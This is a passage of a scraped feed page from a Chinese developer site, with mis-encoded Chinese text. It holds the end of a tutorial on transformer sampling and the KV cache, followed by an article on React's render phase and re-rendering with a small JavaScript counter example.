mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<h5 data-id="heading-5">1.2.2 Final Linear + SoftMaxé‡‡æ ·</h5>
<p><strong>è¾“å…¥ï¼š</strong> ç»è¿‡Casual AttentionåçŸ©é˜µAï¼ŒA.shape=(3,2)</p>
<p>æ­¤æ—¶Aæ— æ³•ä¸E.Tè¿›è¡Œç›¸ä¹˜ï¼Œæ‰€ä»¥éœ€è¦å…ˆç»™Aåšä¸€æ¬¡çº¿æ€§å˜æ¢W_Oï¼ŒW_O.shape=(2,5)</p>
<p>çŸ©é˜µlogitis=AW_OE^Tï¼Œlogits.shape=(6,6)</p>
<p>å–logitsæœ€åä¸€è¡Œè¿›è¡Œé‡‡æ ·ï¼Œå³SoftMax(logitis[-1])ï¼Œå‡å®šç»“æœä¸º[0.1, 0.1, 0.1, 0.4, 0.1, 0.2]ï¼Œæ¦‚ç‡æœ€é«˜çš„ä¸ºindex=3ï¼Œä¸º<strong>ä¹ </strong></p>
<p><strong>è‡ªå›å½’ï¼š</strong> å°†ä¹ åŠ å…¥è¾“å…¥ï¼Œå¾—åˆ°<strong>æˆ‘çˆ±å­¦ä¹ </strong>ï¼Œå°†è¿™ä¸ªå¥å­é‡æ–°ä½œä¸ºè¾“å…¥ï¼Œé‡å¤ä¸Šé¢çš„æ¨ç†è¿‡ç¨‹ï¼Œå†å¾—åˆ°è¾“å‡º <strong>!</strong></p>
<h3 data-id="heading-6">2. KVCache</h3>
<p>æˆ‘ä»¬é‡æ–°å›é¡¾ä¸Šé¢æ¨ç†è¿‡ç¨‹ï¼š</p>
<p><strong>è¾“å…¥1ï¼š</strong> æˆ‘çˆ±å­¦</p>
<p>é€šè¿‡ä¸€ç³»åˆ—è¿‡ç¨‹ï¼Œæœ€åé‡‡æ ·å¾—åˆ°<strong>ä¹ </strong>ï¼Œå°†ä¹ åŠ å…¥è¾“å…¥</p>
<p><strong>è¾“å…¥2ï¼š</strong> æˆ‘çˆ±å­¦ä¹ </p>
<p>é€šè¿‡ä¸€ç³»åˆ—è¿‡ç¨‹ï¼Œæœ€åé‡‡æ ·å¾—åˆ° <strong>!</strong> ï¼Œå°†!åŠ å…¥è¾“å…¥ï¼Œç›´åˆ°æœ€åé‡‡æ ·åˆ°æˆ–è€…æ»¡è¶³å…¶å®ƒæ¡ä»¶ï¼Œæ‰ç»ˆæ­¢é‡‡æ ·</p>
<p>æ˜¾ç„¶ä¸¤æ¬¡è¾“å…¥å­˜åœ¨ç›¸åŒçš„å‰ç¼€<strong>æˆ‘çˆ±å­¦</strong>ï¼Œé‚£ä¹ˆåœ¨æˆ‘ä»¬è¿›è¡Œç¬¬äºŒæ¬¡æ¨ç†æ—¶ï¼Œèƒ½å¦åˆ©ç”¨ç¬¬ä¸€æ¬¡æ¨ç†è¿‡ç¨‹ä¸­çš„éƒ¨åˆ†å†…å®¹å‘¢ï¼Œä»ä¸Šé¢çš„æ¨ç†è¿‡ç¨‹å¯ä»¥çŸ¥é“ä¸¤æ¬¡æ¨ç†çš„ç›¸åŒå‰ç¼€çš„<strong>Kï¼ŒV</strong>çŸ©é˜µæ˜¯å®Œå…¨ç›¸åŒçš„ï¼ˆç”šè‡³QçŸ©é˜µä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œä½†æ˜¯ä¹‹å‰çš„QçŸ©é˜µå¹¶æ²¡æœ‰å†åˆ©ç”¨çš„ä»·å€¼ï¼Œæ‰€ä»¥ä¸éœ€è¦å†è¿›è¡Œç¼“å­˜ï¼‰</p>
<blockquote>
<p>å›¾ç‰‡ä¸­ç°è‰²ä»£è¡¨ç¼“å­˜çš„å†…å®¹</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ab342a7c62840348f05df882e71b814~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTkwMTkzMDUyNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891734&amp;x-signature=9TshUUbqWvkt%2F5W9y27z2yOM6Hk%3D" alt="image-20260205181445414.png" loading="lazy"/></p>
<h3 data-id="heading-7">3. å‚è€ƒèµ„æ–™</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fjalammar.github.io%2Fillustrated-transformer%2F" target="_blank" title="https://jalammar.github.io/illustrated-transformer/" ref="nofollow noopener noreferrer">The Illustrated Transformer</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV17CPkeEEzk%2F%3Fspm_id_from%3D333.1007.top_right_bar_window_default_collection.content.click%26vd_source%3D425446e3f98a8c23e0b3e8b615313ea9" target="_blank" title="https://www.bilibili.com/video/BV17CPkeEEzk/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&amp;vd_source=425446e3f98a8c23e0b3e8b615313ea9" ref="nofollow noopener noreferrer">ã€8ã€‘KV Cache åŸç†è®²è§£</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[re-render]]></title>    <link>https://juejin.cn/post/7602965400809472050</link>    <guid>https://juejin.cn/post/7602965400809472050</guid>    <pubDate>2026-02-05T10:28:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602965400809472050" data-draft-id="7603054272159023154" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="re-render"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-05T10:28:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tiffany"/> <meta itemprop="url" content="https://juejin.cn/user/3456520291097790"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            re-render
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3456520291097790/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tiffany
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:28:14.000Z" title="Thu Feb 05 2026 10:28:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ¸²æŸ“</h2>
<p>é‚£ä¹ˆé¦–å…ˆï¼Œæˆ‘ä»¬è¦èŠçš„å°±æ˜¯ React çš„æ¸²æŸ“æœºåˆ¶ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å¼„æ¸…æ¥šåœ¨è®² React æ¸²æŸ“çš„æ—¶å€™ï¼Œæˆ‘ä»¬å…·ä½“åœ¨è¯´çš„æ˜¯ä»€ä¹ˆã€‚</p>
<p>å½“æˆ‘ä»¬è°ƒç”¨ <code>ReactDOM.render(&lt;App /&gt;)</code>ï¼ˆè¿™é‡Œå°±ä¸ä¸“é—¨ç”¨ <code>createRoot</code> API äº†ï¼‰çš„æ—¶å€™ï¼Œæˆ–è€…å½“æˆ‘ä»¬è°ƒç”¨ <code>setState</code> çš„æ—¶å€™ï¼ŒReact ä¼šä»æ ¹èŠ‚ç‚¹å¼€å§‹é‡æ–°è®¡ç®—ä¸€æ¬¡æ•´ä¸ªç»„ä»¶æ ‘ï¼š</p>
<ol>
<li>React ç”Ÿæˆæ–°çš„ Virtual DOM æ ‘ã€‚</li>
<li>å¹¶ä¸æ—§çš„ Virtual DOM æ ‘åš diffã€‚</li>
<li>å¾—åˆ°æœ€ç»ˆéœ€è¦åº”ç”¨çš„æ›´æ–°ã€‚</li>
<li>ç„¶åæ‰§è¡Œæœ€å°ç¨‹åº¦çš„ DOM API æ“ä½œã€‚</li>
</ol>
<p>è¿™é‡Œé¢åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼š</p>
<ul>
<li>render phaseï¼Œä¹Ÿå°±æ˜¯åˆ°è®¡ç®—å¾—åˆ°æœ€ç»ˆéœ€è¦æ‰§è¡Œçš„ DOM æ›´æ–°æ“ä½œä¸ºæ­¢çš„æ­¥éª¤</li>
<li>commit phaseï¼ŒæŠŠè¿™äº›æ›´æ–° apply åˆ° DOM æ ‘ä¸Š</li>
</ul>
<p>è€Œæˆ‘ä»¬è¦èŠçš„<strong>æ¸²æŸ“</strong>å°±æ˜¯ä¸“é—¨æŒ‡çš„ç¬¬ä¸€ä¸ªæ­¥éª¤ï¼Œä¹Ÿå°±æ˜¯ <strong>render phase</strong>ï¼Œè¿™ä¸ªé˜¶æ®µæ˜¯çº¯ç²¹çš„ JS æ‰§è¡Œè¿‡ç¨‹ï¼Œä¸æ¶‰åŠä»»ä½•çš„ DOM æ“ä½œã€‚åœ¨ React ä¸­ï¼Œä¸€æ—¦ Virtual Dom diff çš„ç»“æœç¡®å®šï¼Œ è¿›å…¥ <strong>commit phase</strong> ä¹‹åï¼Œä»»åŠ¡å°±æ— æ³•å†è¢«æ‰“æ–­ï¼Œè€Œä¸” commit çš„å†…å®¹æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥åŸºæœ¬ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¼˜åŒ–ç©ºé—´ã€‚</p>
<p>å› æ­¤å›´ç»• React æ€§èƒ½ä¼˜åŒ–çš„è¯é¢˜ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯å† render phase å±•å¼€ï¼Œ æ‰€ä»¥è¿™ç¯‡æ–‡ç« è‡ªç„¶ä¹Ÿå°±å›´ç»•ç€ render phase â€”â€” ä¹Ÿå°±æ˜¯æ¸²æŸ“ â€”â€” å±•å¼€ã€‚</p>
<p>ReactDOM.render()ä¸€èˆ¬éƒ½æ˜¯åˆæ¬¡æ¸²æŸ“æ—¶è¿›è¡Œçš„ï¼Œé‚£ä¹ˆæ•´ä¸ªèŠ‚ç‚¹æ ‘ä¸­çš„ç»„ä»¶éƒ½ä¼šæ‰§è¡Œæ¸²æŸ“å°±æ²¡æœ‰ä»€ä¹ˆå¯å¥‡æ€ªçš„ï¼Œæ‰€ä»¥æœ¬æ–‡ä¸»è¦å›´ç»•ç€æ›´æ–°æ¥è®¨è®ºï¼Œ ä¹Ÿå°±æ˜¯ <strong>setState</strong>ï¼ˆæˆ–è€…è¯´useStateè¿”å›çš„setterï¼‰ã€‚</p>
<p>æˆ‘ä»¬é¦–å…ˆè¦ææ¸…æ¥šçš„æ˜¯å½“æ‰§è¡ŒsetStateçš„æ—¶å€™ï¼ŒReact ä¼šåšä»€ä¹ˆã€‚</p>
<p>React æ˜¯ä¸€ä¸ªé«˜åº¦éµå¾ª FPï¼ˆå‡½æ•°ç¼–ç¨‹ï¼‰çš„æ¡†æ¶ï¼Œå…¶æ ¸å¿ƒé€»è¾‘å°±æ˜¯<strong>UI = fn(props &amp; state)</strong> ï¼Œè¿™é‡Œçš„fnå°±æ˜¯ç»„ä»¶ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ç»„ä»¶æ ‘ã€‚ åœ¨ React çš„è®¾è®¡åˆæœŸï¼Œå°±æ˜¯å¸Œæœ›ç»„ä»¶ï¼ˆæ ‘ï¼‰æ˜¯ä¸€ä¸ªçº¯å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç»„ä»¶çš„è¾“å‡ºå®Œå…¨ç”±è¾“å…¥å†³å®šï¼Œä¸ä¼šå—åˆ°ä»»ä½•å¤–éƒ¨å› ç´ çš„å½±å“ï¼Œè¿™æ ·çš„å¥½å¤„å°±æ˜¯ï¼Œç»„ä»¶çš„è¾“å‡ºæ˜¯å¯é¢„æµ‹çš„ï¼Œ</p>
<p><strong>æ³¨æ„ï¼š</strong> å³ä¾¿æ˜¯ ClassComponent æ—¶æœŸï¼ŒReact ä¹Ÿä¸æ˜¯ä¸€ä¸ªé¢å‘å¯¹è±¡çš„æ¡†æ¶ï¼ŒReact å¯¹å¾… ClassCompoonent çš„æ ¸å¿ƒï¼Œä»ç„¶æ˜¯å…¶ render å‡½æ•°ï¼Œè€Œ instance çº¯ç²¹æ˜¯ç”¨äºå­˜å‚¨ state å’Œ props çš„ã€‚</p>
<h3 data-id="heading-1">åŸºç¡€è§„åˆ™</h3>
<p>é»˜è®¤ React å¹¶æ²¡æœ‰å¤ªå¤šçš„æ¸²æŸ“ä¼˜åŒ–ï¼Œå½“æˆ‘ä»¬é€šè¿‡setStateè§¦å‘äº†ä¸€æ¬¡æ›´æ–°ï¼ŒReact ä¼šä»æ ¹èŠ‚ç‚¹å¼€å§‹é‡æ–°è®¡ç®—ä¸€æ¬¡æ•´ä¸ªç»„ä»¶æ ‘ã€‚ æ˜¯çš„ï¼Œä½ æ²¡æœ‰çœ‹é”™ï¼Œ<strong>ä¸è®ºä½ åœ¨å“ªé‡Œè§¦å‘äº†setStateï¼Œæœ€ç»ˆéƒ½ä¼šå¯¼è‡´æ•´ä¸ªç»„ä»¶æ ‘çš„é‡æ–°è®¡ç®—</strong>ï¼ŒReact ä¼šä»æ ¹èŠ‚ç‚¹å¼€å§‹ä¸€æ¬¡éå†ï¼Œä»¥è®¡ç®—å‡ºæœ€æ–°çš„ VirtualDomTreeã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong> è‡³å°‘åœ¨ React16 ç‰ˆæœ¬ä½¿ç”¨ Fiber é‡æ„å…¶ Reconciliation ç®—æ³•ä¹‹åæ˜¯è¿™æ ·çš„ï¼Œæ¯æ¬¡setStateæ›´æ–°éƒ½ä¼šåŠ å…¥åˆ°ä¸€ä¸ªæ›´æ–°é˜Ÿåˆ—ä¸­å¹¶ä¸”æš‚å­˜åœ¨ root èŠ‚ç‚¹ä¸Šï¼Œ ç­‰åˆ°è¿™æ¬¡ event loop ä¸­æ‰€æœ‰çš„ update éƒ½è¿›å…¥é˜Ÿåˆ—ï¼ŒReact å†ä»æ ¹èŠ‚ç‚¹ä¸Šè¯»å–æ”¹æ›´æ–°é˜Ÿåˆ—å¹¶å¼€å§‹é‡æ–°æ¸²æŸ“ã€‚</p>
<p>é™¤äº†åé¢è¦è®²çš„memoä¹‹å¤–ï¼ŒReact é»˜è®¤æœ‰ä¹Ÿæœ‰ä¸€é¡¹ä¼˜åŒ–ï¼ŒReact æ¸²æŸ“è™½ç„¶æ˜¯ä»æ ¹èŠ‚ç‚¹å¼€å§‹çš„ï¼Œä½†æ˜¯åœ¨éå†è¿‡ç¨‹ä¸­å¦‚æœå‘ç°èŠ‚ç‚¹æœ¬èº«ä»¥åŠç¥–å…ˆèŠ‚ç‚¹æ²¡æœ‰æ›´æ–°ï¼Œ è€Œæ˜¯å…¶å­æ ‘å‘ç”Ÿäº†æ›´æ–°ï¼Œé‚£ä¹ˆè¯¥èŠ‚ç‚¹ä¹Ÿä¸ä¼šè¢«é‡æ–°æ¸²æŸ“ï¼Œæˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªä¾‹å­ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2Fgz588t%3Ffile%3D%252Fsrc%252FApp.js%253A20%252C15" target="_blank" title="https://codesandbox.io/p/sandbox/gz588t?file=%2Fsrc%2FApp.js%3A20%2C15" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/gâ€¦</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> renderTimes = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> renderTimes++;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;click {count}<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
);
}

<span class="hljs-keyword">let</span> appRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    {appRenderTime++}
    <span class="hljs-tag">&lt;<span class="hljs-name">Parent</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œstate çš„æ›´æ–°å‘ç”Ÿåœ¨Parentç»„ä»¶ä¸­ï¼Œè€Œå½“Parentç»„ä»¶æ›´æ–°å¯¼è‡´é‡æ–°æ¸²æŸ“æ—¶ï¼Œè™½ç„¶Childç»„ä»¶æ²¡æœ‰ä»»ä½•çš„ props å’Œ state å˜åŒ–ï¼Œ ä½†å…¶ä»ç„¶é‡æ–°æ¸²æŸ“äº†ï¼ˆrenderTimes å¢åŠ äº†ï¼‰ï¼Œç›¸å¯¹çš„Appç»„ä»¶å´æ²¡æœ‰é‡æ–°æ¸²æŸ“ï¼Œè¿™å°±è¯´æ˜ state çš„æ›´æ–°åªä¼šå¯¼è‡´æ›´æ–°èŠ‚ç‚¹çš„å­æ ‘é‡æ–°æ¸²æŸ“ï¼Œå¹¶ä¸ä¼šå½±å“ç¥–å…ˆèŠ‚ç‚¹ã€‚</p>
